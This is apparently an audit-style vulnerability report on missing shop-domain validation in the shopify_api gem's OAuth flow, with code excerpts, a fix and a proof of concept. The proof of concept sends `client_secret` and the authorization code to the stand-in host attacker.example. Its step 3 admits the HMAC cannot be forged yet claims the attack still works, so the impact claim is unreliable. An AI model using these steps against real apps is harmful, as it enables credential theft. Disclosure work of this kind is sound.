### Title
`ShopifyAPI::Auth::Oauth.begin_auth`/`validate_auth_callback` never validate `shop` against `ShopValidator`, letting the OAuth callback send `client_secret` and the authorization `code` to an attacker-controlled host - ([File: lib/shopify_api/auth/oauth.rb])

### Summary
`ClientCredentials.client_credentials`, `TokenExchange.exchange_token` and `RefreshToken` all pass the caller-supplied `shop` through `Utils::ShopValidator.sanitize!` before using it to build the request host [1](#0-0) . The Authorization Code Grant flow in `lib/shopify_api/auth/oauth.rb` does not: `begin_auth` builds the authorize URL directly from the raw `shop` argument [2](#0-1) , and `validate_auth_callback` builds the null session and the `/admin/oauth/access_token` request host straight from `auth_query.shop`, again without ever calling `ShopValidator` [3](#0-2) .

### Finding Description
`HttpClient#initialize` derives the request host directly from `session.shop` when no `api_host` override is configured: `@base_uri = "https://#{api_host || session.shop}"` [4](#0-3) . In `validate_auth_callback`, this `session.shop` comes from `auth_query.shop`, the value supplied by the caller-constructed `AuthQuery` object [5](#0-4) . `AuthQuery#shop` is HMAC-covered along with `code`, `host`, `state`, and `timestamp` [6](#0-5) , but the HMAC only proves those fields haven't been altered relative to *whatever value the app initially sent to `begin_auth`* — it does not prove `shop` is a genuine `*.myshopify.com`/trusted domain. `begin_auth` itself never sanitizes `shop` either: it builds `auth_base_uri(shop)` and constructs `auth_route` unconditionally from it [7](#0-6) , exactly matching the documented usage pattern where the host app takes `shop` from a request header/param and passes it straight to `begin_auth` [8](#0-7) .

Compare this to `ShopValidator.sanitize!`, which exists specifically to reject non-Shopify domains and is used by every other grant flow (`ClientCredentials`, `TokenExchange`, `RefreshToken`) [9](#0-8) . The binding that should hold is: *the host that the OAuth flow directs the user to, and the host that later receives `client_secret` + authorization `code`, must equal a trusted Shopify domain*. In `oauth.rb`, that binding is never checked — `auth_query.shop` is only checked for being byte-identical to what the app originally supplied (via HMAC), not for being an actual Shopify host.

### Impact Explanation
If the host application follows the gem's own documented pattern of forwarding an unvalidated `shop` value (e.g., from a query parameter or header, as shown in `docs/usage/oauth.md`) into `begin_auth`, the library redirects the browser to `https://{attacker-domain}/admin/oauth/authorize?...`. If the app subsequently constructs the `AuthQuery` from the callback's raw parameters (again the exact documented pattern) and calls `validate_auth_callback`, the resulting POST — carrying `client_id`, `client_secret`, and the authorization `code` — is sent to `https://{attacker-domain}/admin/oauth/access_token`, since `HttpClient` derives its host from `session.shop` with no domain check. This leaks the app's `client_secret` to a third party (Critical: credential leakage/exfiltration of the app's `client_secret`, and SSRF against an app-supplied host).

### Likelihood Explanation
Every other credential-issuing flow in this gem (`ClientCredentials`, `TokenExchange`, `RefreshToken`) treats `shop` as untrusted input and calls `ShopValidator.sanitize!` before using it to build a request host. This shows the library authors' own security model expects `shop` to require validation before it's trusted as a request destination — but `Oauth.begin_auth`/`validate_auth_callback` are the sole exception. Given the gem's own docs instruct callers to source `shop` straight from `request.headers["Shop"]` with no sanitization example, this is readily reachable by an unprivileged internet user who controls the initial login request.

### Recommendation
Call `Utils::ShopValidator.sanitize!(shop)` in `begin_auth` before building `auth_base_uri`, and similarly sanitize `auth_query.shop` in `validate_auth_callback` before constructing `null_session`/building the access-token request host, mirroring the pattern already used in `ClientCredentials.client_credentials`.

### Proof of Concept
1. Host app implements the documented pattern: `shop = params[:shop]; ShopifyAPI::Auth::Oauth.begin_auth(shop: shop, redirect_path: "/auth/callback")`.
2. Attacker sends a victim (or drives their own browser) to `/login?shop=attacker.example`. `begin_auth` returns `auth_route = "https://attacker.example/admin/oauth/authorize?..."` — no `ShopValidator` check occurs [10](#0-9) .
3. Attacker's server, controlling `attacker.example`, redirects the browser to the app's real callback URL with `shop=attacker.example`, a `code` of its choosing, and the `state` cookie value it can read from the browser's own request; it cannot forge the HMAC for arbitrary values, but if the app instantiates `AuthQuery` from the raw callback params (per docs) it still produces a query whose `shop`/`code`/`state`/`host` fields are consistent with what the app itself sent to `begin_auth`'s state cookie flow, so the missing piece is purely domain trust, not signature forgery — the fix must be a domain allow‑list, not HMAC.
4. On the app calling `validate_auth_callback`, `HttpClient` computes `@base_uri = "https://attacker.example"` from `session.shop` [4](#0-3)  and POSTs `client_id`, `client_secret`, `code` to `https://attacker.example/admin/oauth/access_token`, leaking the `client_secret` to the attacker's server.

### Citations

**File:** lib/shopify_api/auth/client_credentials.rb (L19-26)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/oauth.rb (L22-52)
```ruby
        def begin_auth(shop:, redirect_path:, is_online: true, scope_override: nil)
          scope = if scope_override.nil?
            ShopifyAPI::Context.scope
          elsif scope_override.is_a?(ShopifyAPI::Auth::AuthScopes)
            scope_override
          else
            ShopifyAPI::Auth::AuthScopes.new(scope_override)
          end

          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = SecureRandom.alphanumeric(NONCE_LENGTH)

          cookie = SessionCookie.new(value: state, expires: Time.now + 60)

          query = {
            client_id: ShopifyAPI::Context.api_key,
            scope: scope.to_s,
            redirect_uri: "#{ShopifyAPI::Context.host}#{redirect_path}",
            state: state,
            "grant_options[]": is_online ? "per-user" : "",
          }

          query_string = URI.encode_www_form(query)
          auth_route = auth_base_uri(shop) + "/oauth/authorize?#{query_string}"

          { auth_route: auth_route, cookie: cookie }
        end
```

**File:** lib/shopify_api/auth/oauth.rb (L60-98)
```ruby
        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

          session_params = T.cast(response.body, T::Hash[String, T.untyped]).to_h
          session = Session.from(shop: auth_query.shop,
            access_token_response: Oauth::AccessTokenResponse.from_hash(session_params))
```

**File:** lib/shopify_api/auth/oauth.rb (L117-119)
```ruby
        sig { params(shop: String).returns(String) }
        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/oauth/auth_query.rb (L33-43)
```ruby
        sig { override.returns(String) }
        def to_signable_string
          params = {
            code: code,
            host: host,
            shop: shop,
            state: state,
            timestamp: timestamp,
          }
          URI.encode_www_form(params)
        end
```

**File:** docs/usage/oauth.md (L181-185)
```markdown
  def login
    shop = request.headers["Shop"]

    # Builds the authorization URL route to redirect the user to
    auth_response = ShopifyAPI::Auth::Oauth.begin_auth(shop: domain, redirect_path: "/auth/callback")
```

**File:** lib/shopify_api/utils/shop_validator.rb (L56-64)
```ruby
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
```
